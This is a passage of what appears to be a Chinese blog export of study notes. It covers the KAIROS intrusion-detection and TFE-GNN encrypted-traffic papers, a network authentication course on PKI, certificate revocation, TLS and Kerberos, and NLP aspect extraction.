使用编码器-解码器架构来重建边缘。编码器将边缘周围的邻域结构和邻域中节点的状态作为输入。节点的状态是与每个节点关联的特征向量，描述节点邻域的变化历史。然后，解码器根据编码器输出的边缘嵌入重建边缘。原始边缘和重建边缘之间的差异称为重建误差。在训练阶段，KAIROS同时训练编码器和解码器，以最大限度地减少良性边缘的重建误差。在部署过程中，各个边缘的重建误差被用作异常检测和调查的基础。此外，KAIROS更新新边的源节点和目标节点的状态。在encoder-decoder结构中，使用基于节点属性的分层特征哈希技术对节点的特征进行编码，利用时间图网络（TGN）对边进行嵌入，通过新的边（事件）动态更新节点特征，可以有效地将时序特征保存在节点特征中，同时边的嵌入也基于邻域内节点的特征向量。这样可以有效地保存事件的时序信息（感觉这个想法还挺常见的，就是要获取时间相关的特征)。\n异常检测。 KAIROS 构建时间窗口队列来检测部署期间的异常情况。为此，KAIROS根据边的重建误差在每个时间窗口中识别一组可疑节点。具有重叠可疑节点的两个时间窗口被排在一起。当新的时间窗口添加到队列时，KAIROS 也会根据重建错误更新队列的异常分数。如果分数超过阈值，KAIROS会认为队列异常并触发警报。因此，KAIROS以时间窗口的间隔定期执行异常检测。在图中，KAIROS 检测到由时间窗口 1、2 和 4 组成的异常队列。\n异常调查。 为了帮助系统管理员推理警报，KAIROS 自动从异常时间窗口队列生成紧凑的攻击摘要图。这涉及识别具有高重建误差的边缘社区以提高易读性。图形简化是必要的，因为与图像和文本不同，图形即使是人类专家也很难可视化和解释。在图中，系统管理员只需要了解 KAIROS 中的一个小的汇总图，而不是跟踪触发警报的异常时间窗口队列中的一个大得多的图。\n补充知识 分层特征哈希 在传统的哈希技术中，常见的方法是将特征空间的维度映射到固定大小的哈希表中。然而，当特征空间非常大时，这种方法可能会导致哈希冲突，进而影响模型的性能。\n分层特征哈希通过将特征空间分解为多个层级来解决这个问题。每个层级都具有不同的哈希函数，用于将特征映射到不同的桶中。通常，初始层级的哈希函数将原始特征映射到较小的中间空间，然后通过逐渐应用更多的哈希函数，将特征映射到最终的哈希桶中。\n分层特征哈希将高维输入向量投影到低维特征空间，同时保留原始输入之间的分层相似性。分层特征哈希在处理大规模高维数据时具有很好的效果，例如在文本分类、推荐系统和图像检索等任务中经常被使用。\nTGN TGN，全称Temporal Graph Networks，是一种针对时间图的网络嵌入方法。在许多实际应用中，包括社交网络、交通网络等，图的拓扑结构和节点的交互是随着时间发展而变化的，这种图被称为时间图。TGN的目标是为时间图中的节点和边生成嵌入向量，以便在这些向量上进行各种预测任务，如链接预测、节点分类等。\nTGN对边的嵌入主要涉及以下步骤：\n节点嵌入更新：当新的边事件（如用户间的交互）发生时，TGN会根据新的边事件信息更新对应节点的嵌入。具体来说，TGN采用了记忆化的节点嵌入更新机制，即根据节点的历史嵌入和新的边事件信息共同决定节点的新的嵌入。 边嵌入生成：在节点嵌入更新后，TGN会生成新的边的嵌入。具体来说，边的嵌入是由连接该边的两个节点的嵌入和边事件的时间信息共同决定的。例如，一种简单的方法是将两个节点的嵌入和边事件的时间信息拼接起来，然后通过一个全连接网络生成边的嵌入。 时间编码器：为了捕获边事件的时间信息，TGN引入了一个时间编码器，它可以将边事件的时间戳编码为一个连续的向量。在生成边的嵌入时，会将这个时间向量和节点的嵌入一起考虑。 通过以上步骤，TGN能够处理时间图中的边事件，并为每个边事件生成一个嵌入向量，这个嵌入向量同时考虑了边事件的拓扑结构信息和时间信息。这使得TGN能够适应图的动态变化，并进行各种预测任务。\n我的评价 贡献主要有：\n提出了PIDS的四个重要指标 提出了新的三对象九交互的建图模式（但是没怎么证明有效性) 提出了时间窗口的社区发现的攻击重建方法，比较紧凑，会更方便溯源人员重建攻击。 实验做的很丰富，包括对不同数据集的分析，以及在相应的数据集上和其他的现有方法的对比做的很好。 我的评价是，这篇文章最厉害的是实验部分，他把DARPA的数据集都做了检测，其他的感觉中规中矩也就，但是他能发SP你有意见吗？\n","date":"2024-03-02T20:15:55+08:00","image":"http://localhost:1313/p/kairos/KAIROS/1715250405508_hu1590076897613839610.png","permalink":"http://localhost:1313/p/kairos/","title":"KAIROS"},{"content":"abstract 目的：实现加密流量[VPN、tor]的分类\n现有局限性：只能提取低级别特征，基于统计的方法对短流无效，对header和payload采取不平等的处理，难以挖掘字节之间的潜在相关性。\n提出方法：\n基于逐点互信息(PMI)的字节级流量图构建方法 基于图神经网络(TFE-GNN)进行特征提取的时序融合编码器模型 引入了一个双嵌入层、一个基于GNN的流量图编码器以及一个交叉门控特征融合机制。[分别嵌入header和payload，然后通过融合实现数据增强] 结果：两个真实数据集（WWT和ISCX）优于SOTA\nintroduction 加密流量保存用户隐私同时也给了攻击者藏身的机会。\n传统的数据包检测（DPI）挖掘数据包中的潜在模式或关键词，面对加密数据包时耗时且准确性低。\n由于动态端口的应用，基于端口的工作不再有效。\n通过数据流的统计特征（e.g.数据包长度的平均值）采用机器学习分类器（e.g.随机森林）来实现分类的方法，需要手工制作的特征工程，并且在某些情况下可能会由于不可靠/不稳定的fow级统计信息而失败。与长流相比，短流的统计特征有更大的偏差（e.g.长度通常服从长尾分布）意味着不可靠的统计特征普遍存在。我们使用数据包字节而非统计特征。\nGNN 可以识别图中隐含的特定拓扑模式，以便我们可以用预测标签对每个图进行分类。目前大多数GNN根据数据包之间的相关性来构建图，这实际上是统计特征的另一种使用形式，导致上述问题。\n用了数据包字节的方法\n平等地对待header和payload，忽略了它们之间的含义差异。 原始字节利用不足，只是将数据包视为节点，将原始字节作为节点特征，不能充分利用。 本文提出了一种基于逐点互信息（PMI）的字节级图构建方法，一种基于图神经网络(TFE-GNN)进行特征提取的时序融合编码器模型。通过挖掘字节之间的相关性来构建流量图，用作TFE-GNN的输入。\nTFE-GNN由三大子模块组成（即双嵌入、流量图编码器和交叉门控特征融合机制）。双嵌入层分别嵌入header和payload；图编码器将图编码为高维图向量；交叉门控特征融合机制对header和payload的图向量融合，得到数据包的整体表示向量。\n使用端到端训练（从输入数据到最终输出直接进行训练，而无需将任务分解为多个独立的阶段或模块），采用时间序列模型，获得下游任务的预测结果。\n实验使用了自收集的WWT（WhatsApp、WeChat、Telegram）和公开的ISCX数据集，与十几个baseline比较得出TFE-GNN效果最好。\npreliminary 1、图的定义\nG = { $V,\\varepsilon,X$}表示一个图，V是节点集合，$\\varepsilon$是边集，X是节点的初始特征矩阵（每个节点的特征向量拼起来）\n$A$是大小为$\\lvert V \\lvert * \\lvert V \\lvert$图的邻接矩阵\n$N(v)$是节点v相邻的节点\n$d_l$是第l层的嵌入维度\nTS(traffic segment)=[$P_{t_1},P_{t_2}...P_{t_n}$]是一段时间内的数据包的集合。$P_{t_i}$是时间戳为$t_i$的数据包，n是流量序列的长度。$t_1,t_2$是流量序列的开始和结束时间。\n2、加密流量分类\nM是训练样本数量\nN是分类类别\n$bs^j_i=[b^{ij}_1, b^{ij}_2,...,b^{ij}_m]$，m是字节序列长度，$b^{ij}_k$是第i个流量样本第j个字节序列的第k个字节\n$s_i=[bs^i_1,bs^i_2,...,bs^i_n)]$，n是序列长度$bs^i_j$为第i个样本的第j个字节序列，可以理解为就是TS\n3、 MP-GNN\nMP-GNN 是 Message Passing Graph Neural Network（消息传递图神经网络）的简称，节点嵌入向量可以通过特定的聚合策略将节点的嵌入向量集成到邻域中，从而迭代更新节点嵌入向量。\n第l层 MP-GNN 可以形式化为两个过程\n其中$h^{(l)}_u,h^{(l)}_v$是节点u和v在第l层的嵌入向量，$m^{(l)}_u$是l层中节点u的计算信息，$MSG^{(l)}$是消息计算函数，$AGG^{(l)}$是消息聚合函数，$\\theta$是他们对应的参数\nmethodology 字节级流量图构造 Byte-level Traffic Graph Construction 节点：某一个字节，注意相同的字节值共享同一个节点，因此节点个数不会超过256，这样能够保持图在一定的规模下，不会太大。\n字节之间的相关性表示：采用点互信息（PMI）来建模两个字节之间的相似性，字节i和字节j的相似性用$PMI(i,j)$表示。\n边：根据PMI值来构造边，PMI值为正：表示字节之间的语义相关性高；而PMI值为零或负值：表示字节之间的语义相关性很小或没有。因此，我们只在PMI值为正的两个字节之间创建一条边。\n节点特征：每个节点的初始特征为字节的值，维度为1，范围为[0,255]\n图构建：由于$PMI(i,j)=PMI(j,i)$，因此该图是个无向图。\nPMI PMI：是一种用于衡量两个事件之间相关性的统计量。\n$$ PMI(A, B) = \\log \\frac{P(A, B)}{P(A) \\cdot P(B)} $$值大于零，则表示 A 和 B 之间有正相关性；如果值等于零，则表示它们之间没有关联；如果值小于零，则表示它们之间有负相关性。\n双嵌入 dual embedding 原因：字节值通常用作进一步向量嵌入的初始特征。具有不同值的两个字节对应两个不同的嵌入向量。然而，字节的含义不仅随字节值本身而变化，还随它所在的字节序列的部分而变化。换句话说，在数据包的header和payload中，具有相同值的两个字节的表示含义可能完全不同。对于header和payload，使用两个不共享参数的嵌入层的双嵌入，嵌入矩阵分别是$E_{header}$和$E_{payload}$\n交叉门控特征融合的流量图编码器 Traffic Graph Encoder with Cross-gated Feature Fusion 因为要double embedding，所以encoder也要两个。\n这里堆叠了N个GraphSAGE\nGraphSAGE 对于图 G 中的每个节点 v，GraphSAGE 通过使用节点 v 的度数归一化其嵌入向量，计算来自每个相邻节点的消息。\n通过逐元素均值运算（element-wise mean operation）计算所有相邻节点$N(v)$的整体消息，并通过串联运算聚合整体消息以及节点v的嵌入向量\n对节点A的嵌入向量进行非线性变换，完成一个GraphSAGE层的正向过程\nGraphSAGE的消息聚合和计算可以描述为\n$m^{(l)}_{N(v)}$是将v节点所有临接节点的上一层嵌入向量求平均的结果\n$h_v^{(l)}$是本层v节点的嵌入向量，$\\sigma(\\cdot)$是激活函数，$CONCAT(\\cdot)$是连接函数。然后通过BatchNorm对h进行批量归一化\n激活函数选择PReLU，将每个负元素值按不同因子缩放，不但引入了非线性，还由于每个负元素的缩放因子的不同而起到类似于注意力机制的作用。\n由于深度GNN模型中的过度平滑问题，我们最多只堆叠GraphSAGE4层，并将输出拼接起来。这与跳转知识网络（JKL）相类似\n最后，通过对每个节点的最终嵌入使用meanpooling来得到图嵌入\n用$g_h,g_p$表示header和payload得到的图嵌入\nCross-gated Feature Fusion 交叉门控特征融合，这个模块的目标是将$g_h,g_p$融合，获取门控矢量$s_h,s_p$。\n如上图，我们用了两个filter，每个filter的组成都是线性层、PReLU、线性层、Sigmoid。\n其中w和b分别是线性层的weight和bias。z 是数据包字节的整体表示向量。\n端到端的下游任务训练 End-to-End Training on Downstream Tasks 由于我们已经将流量段中每个数据包的原始字节编码为表示向量z，因此可以将段级分类任务视为时间序列预测任务。\n这里我们使用双层Bi-LSTM作为baseline，他的输出喂给一个带PReLU的两层线性分类器，使用交叉熵作为损失函数\nn是长度，CE是交叉熵，y是ground truth（标注数据的分类标签）\n实验部分还有一个用transformer的\nexperiments 介绍了实验设置，在很多数据集和baseline上做了对比实验，做了消融实验（good）\n还分析了TFE-GNN的灵敏度，回答了\n每个组件的功能 哪个GNN架构效果最好 TFE-GNN的复杂度如何 超参数的变化在多大程度上会影响TFE-GNN的有效性 实验设置 数据集：ISCX VPN-nonVPN , ISCX Tor-nonTor , self-collected WWT datasets.\n预处理：对于每个数据集，筛除\n空流或空段：所有数据包都没有有效负载（用于establish 连接） 超长流或超长段：长度（即数据包数）大于 10000 然后对于每个数据包，删掉以太网标头，源 IP 地址和目标 IP 地址以及端口号都将被删除，以消除IP地址和端口号的敏感信息的干扰##\n细节：一个样本的最大数据包数设置为50，最大有效负载字节长度和最大标头字节长度分别设置为 150 和 40，PMI 窗口大小设置为 5\nepoch设置为120，lr为1e-2，用Adam优化器分512批次将lr从1e-2衰减到1e-4。warmup为0.1，droupout为0.2.\\\n运行了10次实验。\n用AC、PR、RC和F1做评估\n和基于传统特征工程的方法（即 AppScanner [31]、CUMUL [23]、K-FP （K-Fingerprinting） [8]、FlowPrint [32]、GRAIN [43]、FAAR [19]、ETC-PS [40]）、基于深度学习的方法（即 FS-Net [18]、 EDC [16]、FFB [44]、MVML [4]、DF [30]、ET-BERT [17]）和基于图神经网络的方法（即 GraphDApp [29]、ECD-GNN [11]）做比较。\n消融实验 在 ISCX-VPN 和 ISCX-Tor 数据集上对 TFE-GNN 进行了消融实验，分别将头、有效载荷、双嵌入模块、跳跃知识网络式串联、交叉门控特征融合和激活函数以及批量归一化分别表示为 \u0026lsquo;H\u0026rsquo;、\u0026lsquo;P\u0026rsquo;、\u0026lsquo;DUAL\u0026rsquo;、\u0026lsquo;JKN\u0026rsquo;、\u0026lsquo;CGFF\u0026rsquo; 和 \u0026lsquo;A\u0026amp;N\u0026rsquo;。不仅验证了TFE-GNN中每个组件的有效性，而且还测试了一些替代模块或操作的影响，用sum、max替换mean，用GRU、transformer替换LSTM\n（只用H或P就不需要DUAL和CGFF）\n得出结论\n数据包标头在分类中起着比数据包有效载荷更重要的作用，不同的数据集具有不同级别的标头和有效载荷重要性 使用双嵌入使 f1 分数分别提高了 3.63% 和 0.95%，这表明其总体有效性。JKN样串联和交叉门控特征融合在两个数据集上都以相似的幅度增强了TFE-GNN的性能。 缺少激活函数和批量归一化在两个数据集上都可以看到显著的性能下降，证明了其必要性 用sum替换mean在两个数据集上分别差了11.1%和29.64%，用max替换mean在VPN上差很多在tor上只差一点 用GRU替换LSTM导致两个都差10%左右，transformer替换LSTM导致VPN差了40%左右，tor上只差一点 换GNN架构为GAT, GIN, GCN and SGC，还是GraphSAGE最好\n此外，通过TFE-GNN可以快捷的拓展一个segment级的全局特征\n复杂度\nTFE-GNN 在模型复杂度相对较小的情况下，在公共数据集上实现了最显着的改进。虽然ET-BERT在ISCX-nonVPN数据集上达到了可比的结果，但ET-BERT的FLOP大约是TFEGNN的五倍，模型参数的数量也增加了一倍，这通常表明模型推理时间更长，需要更多的计算资源。此外，ETBERT的预训练阶段非常耗时，由于预训练期间有大量的额外数据，并且模型复杂度高，因此成本很高。相比之下，TFE-GNN可以实现更高的精度，同时降低训练或推理成本。\n双重嵌入维度的影响。为了研究双嵌入层隐藏维度的影响，我们进行了灵敏度实验，结果如图a所示。正如我们所看到的，当嵌入维度低于 100 时，f1 分数会迅速增加。在此之后，随着维度的变化，模型性能趋于稳定。为了减少计算消耗，选取50作为默认维度\nPMI窗口大小的影响。从图 b 中可以看出，较小的窗口大小通常会导致更好的 f1 分数。窗口越大图中添加的边就越多，由于图太密集，模型将更难分类。\n段长的影响。从图 c 中，我们可以得出一个结论，即用于训练的短段长度通常会使性能更好。\nconclusion and future work 我们提出了一种构建字节级流量图的方法和一个名为 TFE-GNN 的模型，用于加密流量分类。字节级流量图构造方法可以挖掘原始字节之间的潜在相关性并生成判别性流量图。TFE-GNN 旨在从构建的流量图中提取高维特征。最后，TFE-GNN可以将每个数据包编码为一个整体表示向量，该向量可用于一些下游任务，如流量分类。选择了几个基线来评估 TFE-GNN 的有效性。实验结果表明，所提模型全面超越了WWT和ISCX数据集上的所有基线。精心设计的实验进一步证明了TFE-GNN具有很强的有效性。\n将来，我们将尝试在以下限制方面改进 TFE-GNN。（1）有限的图构建方法。所提模型的图拓扑结构是在训练过程之前确定的，这可能会导致非最佳性能。此外，TFE-GNN无法应对每个数据包的原始字节中隐含的字节级噪声。（2） 字节序列中隐含的未使用的时间信息。字节级 trafc 图的构造没有引入字节序列的显式时间特征。\n","date":"2024-02-16T16:28:03+08:00","image":"http://localhost:1313/p/tfe-gnn/pic/1708314808397_hu5662492592241229638.png","permalink":"http://localhost:1313/p/tfe-gnn/","title":"TFE GNN"},{"content":"导语 说是开课以来从未有过挂科选手，但是想得不错的分数还是要努努力，进自己脑子的知识才是最好的知识\n笔记 网络认证技术 ≈ 密码学+计算机网络\n网络认证：在信息系统/网络环境中，实现身份的确认。目标：在不可信的网络环境中确认主体是谁，有什么属性、权限、能力\n身份确认的主体：人、设备、软件服务……\nPKI：公钥基础设施\nCA：认证中心，生成数字证书\nCA是PKI的核心组成成分，但是在很多地方把CA和PKI混用了。\n考试用 两个半小时\n题型：\n判断 2分 简答 5-8分 建议不要空这 关键是原理之类的要记住的\n01 导言（意义不大） 相关概念\n02 密码学基础（会涉及题目，需要复习复习） 对称：加解密\n非对称：签名\n光看密钥长度不能知道强度，RSA1024bits=ECC160bits。短密钥可以达到高强度\n哈希：验证\n消息鉴别码：MAC=C(K,M)，K为密钥M为消息，把密钥跟着一块哈希了\n可鉴别加密CCM、GCM、AEAD（简单了解）\n国外的密码基本原理不细说了\n国产的了解一下\nSM2 非对称 ECC \u0026mdash; 椭圆曲线 知道基于椭圆曲线域上的离散对数困难问题。 替换RSA\nSM3 哈希 256bit和sha256差不多 分组长度512bit，摘要值长度256bit\nSM4 分组工作模式\nECB：对每个块独立加密：明文同样的块会加密成同样的密文\nCBC：明文先与上一个密文异或在加密，需要初始化向量\nOFB：将块密码转为流密码，生成密钥流的块\nCTR（ICM、SIC）：将块密码变为流密码，通过递增加密计数器产生密钥流\nZUC 流密码\n128位的初始密钥key和128位的初始向量iv来作为输入。每个时钟周期能生成32bit\n共享密钥问题-\u0026gt;为什么要有非对称的原因-\u0026gt;数字签名\n03 口令鉴别 client 用复杂口令，不要告诉别人，次数限制\n传输 使用已被验证的安全信道\nserver 存储，验证\n04 基于密码技术的鉴别 两大类：\n对称： 有没有密钥\n提一个协议框架，让你看有没有什么错，一些参数有什么用【用什么方式可以抵抗什么攻击】\nreplay attack（重放攻击）：通过加一个nonce抵抗\noracle session attack（就是攻击者使另一方帮自己来计算）：让u和v不同。比如u为加密，v为解密，被挑战方只能加密，就不能被当成解密服务器了。\nParallel Session attack：p(), q()与方向有关。从而攻击者不能利用服务器的计算。比如发起者会加一个xor，被挑战者会加一个左移\noffset attack：\n把返回的东西改为E(f()#E(g))\n可信第三方，kobras\n非对称：数字签名和验证\n单向（带一个时间戳之类的约定好的东西）、双向（A发给B后B还要发给A）\nPPT标红好好看看\n05+06 PKI技术 CA：认证机构，权威第三方，公钥（证书）可信发布[根CA、子CA]\nRA：注册机构，审查信息，防止CA职能太多导致一个出问题导出都出问题\nrepository（存数据的吧）\nCRL（Certificate Revocation List，证书撤销列表）\nOnline Certificate Status Protocol（OCSP）一种通信协议，专门用于检查证书是否已经被撤销 相应的服务器称为OCSP Server-\u0026gt;（证书有三种状态）Good、Revoked、Unknown ：未撤销、已经撤销、未知\nASN.1-基本数据类型-DER编码-sequence-implicit/explicit tag 稍微看一下\n07 证书拓展 证书基本域\n证书扩展域 X.509版本3 18种，了解功能即可\n拓展有关键和非关键，如果关键出了错（识别不出来），直接认定证书非法。非关键出错则忽略拓展\nBasic Constraints：区分是否是CA证书（能否签发其他证书）以及路径的深度（说明CA可以有多少层次的下级）\nAuthority Key Identifier：证书链中可能有多个公钥，这个确定哪个是用来验证证书的颁发者（CA）的公钥\nSubject Key Identifier：证书链中可能有多个公钥，确定哪个是证书自己的公钥\nKey Usage：密钥的用途。7种+2种辅助用途\nPrivate Key Usage Period：给出证书有效的开始到结束的时间\nIssuer Alternative Name：放置签发者（CA）的消息（DN存放CA信息，子CN没法用DN，就用这来放）\nSubject Alternative Name：放置证书拥有者的消息\nSubject Directory Attributes：可加入任何与Subject有关的信息，例如，民族、生日等\nName Constraints：限制下级CA所能够签发证书的订户的名字空间（只在下级CA中有用）\nCertificate Policies（CP）：区分不同证书的安全等级\nInhibit Any-Policy：（CP的Any-Policy指对于该CA所签发的订户证书的CP没有限制），值是整数N，表示：在证书路径中，本证书之下的N个证书可带有Any-Policy的证书\nPolicy Mappings：说明了不同CA域之间的CP等级的相互映射关系\nPolicy Constraints：对于证书认证路径的策略映射过程中，有关CP的处理，进行限制。N：在N个证书后，不允许再进行策略映射；M：在M个证书后，就必须要有认识的、明确的CP\nExtended Key Usage：证书/密钥可用的用途（拓展）\nCRL Distribution Points：和应用系统约定在哪儿获取CRL\nFreshest CRL：增量CRL情况下，获取最新的增量CRL的地址\nAuthority Information Access：如何在Internet上面，访问一些CA的信息（目前只有 1、上级CA的情况 2、OCSP服务器的情况两个信息）\nSubject Information Access： l如何在Internet上面，访问一些用户的信息 （目前只有 1、资料库的地址（针对CA）2、TSA服务地址（针对TSA服务器））\n08 PKI信任体系 信任模型\n单根CA\n多根CA 根之间要互相通信-CTL（用户自主+权威发布）沟通方式、原理、优缺点，应用\nCTL（信任锚）由权威机构统一地发布1个可信的信任锚列表（Certificate Trust List）包括多个根CA证书文件的HASH结果和受信任CA对其签名\n【信任锚里有根CA证书的hash、其他CA证书、CRL、信任策略和规则等。然后由一个我信任的CA对CTL签名，一般不用CTL里信任的CA来签名。】\n方式：1、不同PKI域用同一个CTL 2、加一个ACA的信任锚说明哪些根CA是可以信任的\n交叉认证-网状mesh-\u0026gt;桥CA\n相当于将对方CA认作是我的子CA。\nmesh-\u0026gt;信任链变成信任网\n桥CA-\u0026gt;不同域之间的证书传递\n09 证书撤销 验证签名-验证有效期-验证撤销状态\n撤销状态 CRL、OCSP、CRT 原理\nCA/CRL Issuer定期地签发CRL CRL，certificate revocation list\n完全CRL－Complete CRL：所有CRL信息一次发布\n增量CRL－Delta CRL：发布新增的CRL信息发布\n直接CRL－Direct CRL：证书签发者签发CRL\n间接CRL－Indirect CRL：使用CRL issuer签发CRL\nOCSP在线证书状态协议 Online Certificate Status Protocol 在线服务器\nCRT：证书撤销树，对于各证书序列号进行一定的结构化，形成了HASH链\n使用了merkle hash tree【区块链信任算法】\n拿加粗的子哈希算哈希，就可以推出根hash，验证起来需要更少的那啥\n10 TLS handshake怎么shake的\n增加一个server对client的鉴别\n如果server证书只能签名不能加密，则要生成一个临时公钥，签名后发给client【ServerKeyExchange】\n两张图里的消息有什么含义 1.3和1.2的区别\n直接在client hello中发了选择算法的key（用server 公钥加密）\n10.5wifi认证 WPA-PSK共享口令 （路由器上做）\nWPA-802.1X 基于账号的身份鉴别 （身份鉴别server）\n客户端或网页 （微信、短信）\n11 不考 12 PKI安全增强 入侵容忍 解决了什么问题？怎么解决的 原理 解决了在入侵场景下的高可用。黑客侵入了其中一个PKI节点无法获利，同时PKI系统任然保持可用性\n【门限密码学：把密钥分成L份，当有其中f+1份时可以解密，否则解密不了】\neg. Shamir\u0026rsquo;s Secret Sharing 基于拉格朗日插值法\neg2. ITTC 基于离散对数的子密钥分配\nserver上用密码算，CA来整合\n也就是说黑客就算攻入了一个节点，他仍然无法获取PKI用来签名证书的私钥，同时其他节点还能继续工作。\n信任增强 解决方式原理 信任机制基本假设：1、CA行为不会出错，证书中的信息不会出错【只有可能是错误操作导致的签发给错误的人】 2、无限制权利\n三个思路：\n1、 浏览器端实施检测：\n（1）浏览器维护证书信息\n（2）多个会话之间互相比较\n2、限制CA权利\n（1）假定server只会向同一个国家的CA申请证书\n（2）限定CA能签发的顶级域名范围\n（3）域名拥有者可以控制哪个CA给他签发证书\n（4）server再次确认机制：\nserver在多一个sovereign Key的公私钥对挂在timeline上，浏览器看到timeline上有sovereign Key，会要求server再次拿sovereign Key私钥签名，黑客控制了CA，却无法获取server的sovereign Key私钥，因此仍然无法伪造身份\n3、证书透明化：\n假定CA也会出错，审计CA\n13 证书透明化 虚假证书：证书可以被严格验证通过，但是证书对应的私钥并不被证书主体拥有，而是被其他人拥有（CA被人黑了，一顿乱发）\n透明化增加哪些步骤SCT相关特点弄清楚一点\n增加\n公开日志服务器（Public Log Server）：保存和维护记录证书的公开日志（Public Log）\n收到证书并验证通过后，公开日志服务器会向提交者返回一个凭据（SCT）Signed Certificate Timestamp。（有可能多个公开日志服务器，就会返回多个SCT）用户不仅需要验证证书，还需要验证相应的SCT（将SCT放入证书中，作为证书扩展）\n用户不仅需要验证证书，还需要验证相应的SCT（将SCT放入证书中，作为证书扩展） 怎么获得SCT呢？ 1.从X.509证书扩展项获得SCT 2.从连接建立时TLS扩展项获得SCT -\u0026gt;TLS客户端要支持 3.从OCSP stapling的扩展项获得SCT 下面不重要\n监视员（Monitor）：周期性的访问公开日志服务器，寻找和发现可疑的证书 审计员（Auditor）：审计公开日志的行为 14 隐式证书 传统和隐式的结构和使用的区别\n在带宽、计算能力、存储资源有限制的环境下，隐式证书是传统X.509证书的一种高效替代\nX.509证书基本内容：订户身份信息+公钥数据+CA数字签名\n隐式证书基本内容：中间公钥数据$P_U$ + 订户身份标识。 最终公钥 P=$P_{CA}$+$P_U$以及身份信息也有关 $P_{CA}$：CA证书公钥\n使用：\nX.509： 需要对订户证书进行CA签名的验证\n隐式证书：需要重构出订户公钥，在对消息的验签时同时完成对证书本身的验证\n隐式证书中，没有对CA数字签名的验证，取而代之的是，重构公钥的计算，后者的计算量较小。\n假名证书不考\n15 kerberos 可信第三方TTP，基于对称密码，也支持在某些过程使用非对称\n获得一个TGT，用TGT和要访问的目，请求问kerberos服务器，来获取访问目标的票据（不是TGT，TGT只是告诉kerberos我已经被验证过了）\nkerberos票据流程\n长期密钥（主密钥）Long-term Key/Master Key： 长期保持不变的密钥。被长期密钥（主密钥）加密的数据尽量不在网络上传输。（防止暴力破解、分析）\n短期密钥（会话密钥）Short-term Key/Session Key： 加密需要进行网络传输的数据。只在一段时间内有效，即使被加密的数据包被黑客截获并破解成功后，这个Key早就已经过期了。\nKDC（Key Distribution Center）：kerberos server作为可信第三方，维护所有帐户（client、server）的注册信息、用户名、口令、用户主密钥、服务器主密钥\nServer 与Client之间基于共享秘密短期密钥key实现身份鉴别\nKDC仅仅是允许进入应用系统，至于有什么权限、由应用系统自主决定\n获取TGT：\nclient发请求，KDC用client的master key加密一个会话密钥$S_{KDC-Client}$，用KDC的master key加密TGT，TGT里包含会话密钥和client信息（让client 鉴别KDC是KDC而非被伪造）\n获取ST：\n这个图有问题，KDC还给client的不是用clinet的master key，而是用session key。\n当client要访问server的时候，给KDC自己的TGT和要访问的server。\nKDC根据TGT来对client进行认证，生成$S_{Server-Client}$和ST(session ticket)\n$S_{Server-Client}$：用client的主密钥加密一个会话密钥，\nST：用server的主密钥加密，ST包含会话密钥和client的信息。\n将这两个被加密的Copy一并发送给Client\nclient得到会话密钥后，用session key解密，创建Authenticator（Client Info + Timestamp）并用会话密钥加密\nclient将ST和Authenticator访问server，server用自己的主密钥解密ST得到会话密钥，在用会话密钥解密Authenticator，比较Authenticator里的client info和ST里的client info来确定client就是client\n那如果TGT没过期，session key过期了呢？可以用TGT再申请一个，因为TGT用KDC的master key加密，KDC可以得到旧的session key和client info，进而再发一个session key。由于session key是TGT的一部分，这其实也就相当于重新申请了TGT\nclient鉴别server（双向鉴别）：\n在Authenticator里在加一个flag要求server自证。\nserver看到后，用ST里得到的会话密钥解密Authenticator，把里面的timestamp用会话密钥加密发给client\n16 OAuth\u0026amp;OIDC 单点登录(Single Sign on)在某个地方认证了之后，在整个域里都不用再认证了。\nSSO 口令记录器-\u0026gt;保存在edge/chrome\nOAuth 协议流程图，理解认证的流程，有那几个角色，分别做了什么\nOIDC 协议流程图，理解认证的流程\n17 FIDO 在服务器端将用户与移动终端的可信环境进行身份绑定 将用户与服务器之间的直接鉴别转变为两段式鉴别 1 移动终端鉴别用户主要是靠生物特征 2 服务器端鉴别移动终端主要是靠数字签名\n","date":"2023-12-27T19:07:10+08:00","image":"http://localhost:1313/img/placeholder.jpeg","permalink":"http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/","title":"网络认证技术笔记"},{"content":"导语 期末全是开放问题，因此弄清楚各种模型的优劣非常有必要。\n笔记 model 常见的模型有DNN、CNN、RNN、GNN、LSTM、\ntask NLP的经典问题有\n在课程中，我们主要学习了\n属性抽取（AE） opinion target和aspect的区别：opinion target是被评价对象，aspect是对象的属性\neg\u0026quot;这个手机的摄像头很出色，但电池寿命较短。\u0026ldquo;手机是opinion target，而摄像头和电池寿命是手机的两个aspect。\n目标：抽取对象。eg：华为技术遥遥领先！-\u0026gt; 抽取出“华为”\nAspect Term Extraction 论文阅读（一） - 知乎 (zhihu.com)\nTHA是用了attention机制的LSTM，用于获得上文（单向）已经标注过的aspect的信息，来指导当前aspect标注。\nSTN是LSTM，用于获得opinion的摘要信息。首先，STN单元获得基于给定aspect的opinion的表示，接下来利用attention机制来获得基于全局的opinion的表示。自此就可以获得基于当前aspect的opinion摘要。将aspect的表示和opinion摘要拼接作为特征，用于标注。\n（表示就是一个框里三个圆圆）\n将ATE形式化为一个seq2seq的学习任务。在这个任务中，源序列和目标序列分别由单词和标签组成。为了使Seq2Seq学习更适合ATE,作者设计了门控单元网络和位置感知注意力机制。门控单元网络用于将相应的单词表示融入解码器，而位置感知注意力机制则用于更多地关注目标词的相邻词。\ndecoder包含一个门控单元，用于控制编码器和解码器产生的隐状态。当解码标签时，这个门控单元可以自动的整合来自编码器和解码器隐状态的信息。\nmasked seq2seq。首先，对输入句子的连续几个词进行掩码处理。然后，encoder接收部分掩码的句子及其标签序列作为输入，decoder尝试根据编码上下文和标签信息重建句子原文。要求保持opinion target位置不变\n观点抽取（OE） 一般都是先抽取aspect，在对aspect进行情感预测的流水线方式\nIMN使用非流水线方式。与传统的多任务学习方法依赖于学习不同任务的共同特征不同，IMN引入了一种消息传递体系结构，通过一组共享的潜在变量将信息迭代地传递给不同的任务\n它接受一系列tokens{x1，…，xn}作为特征提取组件fθs的输入，该组件在所有任务之间共享。该组件由单词嵌入层和几个特征提取层（好多个CNN）组成。输出所有任务共享的潜在向量{hs1，hs2，…，hsn}的序列。该潜在向量序列会根据来自不同任务组件传播来的信息来更新。\n$hi^{s(T)}$ 